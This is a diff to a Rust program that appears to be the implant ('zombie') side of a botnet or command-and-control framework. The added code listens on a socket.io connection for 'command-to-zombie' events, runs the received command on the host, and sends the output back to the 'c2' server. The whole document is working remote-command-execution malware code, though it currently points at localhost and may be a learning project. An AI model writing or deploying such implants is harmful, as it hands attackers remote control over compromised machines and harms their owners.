@@ -1,13 +1,16 @@
 mod constants;
-
-use std::time::Duration;
+mod utils;
+mod zombies;
 
 use constants::localhost::{LOCALHOST_ADDRESS, LOCALHOST_PORT};
 use futures_util::FutureExt;
 use rust_socketio::{
     asynchronous::{Client, ClientBuilder},
-    Payload,
+    Error, Payload,
 };
+use std::time::Duration;
+use utils::types::command_payload::parse_command_data;
+use zombies::run_command::run_command;
 
 #[tokio::main]
 async fn main() {
@@ -23,10 +26,22 @@ async fn main() {
         })
         .on("command-to-zombie", |payload, socket: Client| {
             async move {
-                println!("Command back received: {:?}", payload);
+                if let Ok(command_data) = parse_command_data(payload) {
+                    match run_command(&command_data.command) {
+                        Ok(output) => {
+                            emit_from_zombie_to_c2(&socket, output).await.unwrap();
+                        }
 
-                if let Err(e) = socket.emit("command-response-from-zombie", payload).await {
-                    println!("Error sending command response: {:?}", e);
+                        Err(e) => {
+                            emit_from_zombie_to_c2(&socket, format!("{}", e))
+                                .await
+                                .unwrap();
+                        }
+                    }
+                } else {
+                    emit_from_zombie_to_c2(&socket, format!("Error parsing command data"))
+                        .await
+                        .unwrap();
                 }
             }
             .boxed()
@@ -39,5 +54,15 @@ async fn main() {
 
     loop {
         tokio::time::sleep(Duration::from_secs(1)).await;
+    }
+}
+
+async fn emit_from_zombie_to_c2<T>(socket: &Client, payload: T) -> Result<(), Error>
+where
+    T: Into<Payload>,
+{
+    match socket.emit("command-response-from-zombie", payload).await {
+        Ok(_) => Ok(()),
+        Err(e) => Err(e),
     }
 }
